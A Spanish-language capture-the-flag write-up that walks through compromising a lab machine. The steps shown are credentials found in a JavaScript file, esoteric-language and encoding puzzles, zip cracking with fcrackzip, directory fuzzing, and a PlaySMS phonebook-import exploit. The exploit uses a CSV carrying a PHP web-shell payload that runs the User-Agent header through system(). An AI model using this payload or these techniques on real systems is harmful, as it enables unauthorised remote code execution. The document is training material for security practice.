## Vulnerability Assessment {-}

### Credenciales en ficheros javascript y lenguaje esoterico {-}

En este caso no tocamos mas porque no queremos ser bloqueados. Si miramos el codigo fuente vemos que hay un fichero `login.js` que contiene las
credenciales.

Entramos las credenciales en la web `admin:superduperlooperpassword_lol` y conseguimos connectarnos y entramos en una pagina que contiene caracteres raros. Esto en concreto
se llama **Lenguaje esoterico**. Pero primero tenemos que buscar que lenguaje esoterico es en concreto.

Si buscamos en la web por `esoteric languages` encontramos una lista de 10 lenguajes esotericos en [esolangs](https://esolangs.org/wiki/Esoteric_programming_language). Uno de ellos nos 
llama la atencion porque es bastante parecido. Este seria el [Ook!](https://esolangs.org/wiki/Ook!). La diferencia es que cada **.** **?** **!** contiene un **Ook** delante.

Copiamos los caracteres en un fichero `data` y lo tratamos para que se paresca al `Ook!`

```bash
cat data | sed 's/\./Ook\./g' | sed 's/\?/Ook\?/g' | sed 's/\!/Ook\!/g' | xclip -sel clip
```

Copiamos el mensaje en la web [dcode.fr](https://dcode.fr). Buscamos el code `Ook!` y colamos el mensaje y decodificando nos da el mensaje **Nothing here check
**/asdiSIAJJ0QWE9JAS** que parece ser una routa.

Si vamos a la url `http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS` vemos una nueva pagina con un nuevo mensaje que parece se **base64**.

```bash
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" 
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' '
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' ' | base64
curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" | xargs | tr -d ' ' | base64 > data

file data
mv data data.zip
```

Aqui vemos que es un comprimido `.zip` y si le damos a `unzip data.zip` vemos que esta protegida por contraseña.


### Crackeando con fcrackzip {-}

```bash
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt data.zip
```

Aqui vemos que la contraseña es `password`.

Volmemos a descomprimir el fichero poniendole la contraseña y vemos un fichero `index.php`

```bash
cat index.php
```

vemos que nuevamente esta encryptada con caracteres del `a-f` y del `0-9` que seria Hexadecimal.

```bash
cat index.php | xxd -ps -r
```

y aqui parece ser nuevamente un base64.

```bash
cat index.php | xxd -ps -r > data
cat data | xargs
cat data | xargs | tr -d ' '
cat data | xargs | tr -d ' ' | base64 -d > data
cat data
```

Estamos nuevame frente a un lenguaje esoterico que parece se un **brainfuck**. Lo copiamos en la clipboard y lo decodificamos nuevamente en la web. En este
caso tiraremos de la web [tutorialspoint](https://www.tutorialspoint.com/execute_brainfk_online.php).

Pegamos el codigo y le damos a **Execute** y vemos el mensaje `idkwhatispass` que nos hace pensar en una contraseña. Intentamos ver si es la contraseña del usuario
admin del panel de authenticacion `Node-Red` pero no funcciona.

### Continuando analyzando las routas {-}

Si vamos a la url `http://10.10.10.111:9999/test` vemos un **php_info**. Lo primero aqui es siempre mirar las **disabled_functions**. No parece ser desabilitadas las
funcciones `exec()`, `shell_exec()` o `system()`.

Vamos a la url `http://10.10.10.111:9999/dev` y vemos un **403 Forbidden**. Como esta Forbidden intentamos ver si a routas validas bajo la routa `/dev` con **WFUZZ**.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.111:9999/dev/FUZZ
```

y encontramos otras routas 
- test
- backup

 Si vamos a la url `http://10.10.10.111:9999/dev/test` nos descarga un fichero. y a la routa `http://10.10.10.111:9999/dev/backup` hay una nueva routa `/playsms`.

Miramos lo que hay en la url `http://10.10.10.111.9999/playsms` y vemos un panel de inicio de session **playsms**. Miramos si hay vulnerabilidades asociadas con searchsploit.

```bash
searchsploit playsms
```

Y vemos que hay exploits con Template Injection y Remote code execution.

Intentamos loggearnos con `admin:admin`, no va y intentamos el password que hemos encontrado antes. `admin:idkwhatispass` y en este caso funcciona.

### Explotando PlaySMS {-}

Buscamos un exploit que nos permite hacer RCE.

```bash
searchsploit playsms | grep -v -i metasploit | grep -i "remote code execution"
searchsploit -x 42044
```

Aqui el exploit nos dice que una vez loggeado con cualquier usuario, tenemos que ir a la url `http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list`,
y uploadear un fichero malicioso backdoor.csv

```csv
Name,Mobile,Email,Groupe code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,22,,
```

Aqui podemos ver que el exploit usa una cabezera para transmitir el comando que queremos ejecutar con la fuccion php `system()`. Esto quiere decir que tenemos que uzar
burpsuite para cambiar el user agent durante el upload.

Lanzamos Burpsuite y interceptamos el envio del fichero backdoor.csv. Cambiamos el User-Agent con `whoami`, Forwardeamos la peticion y en la web podemos ver
`www-data` en la columna Name.

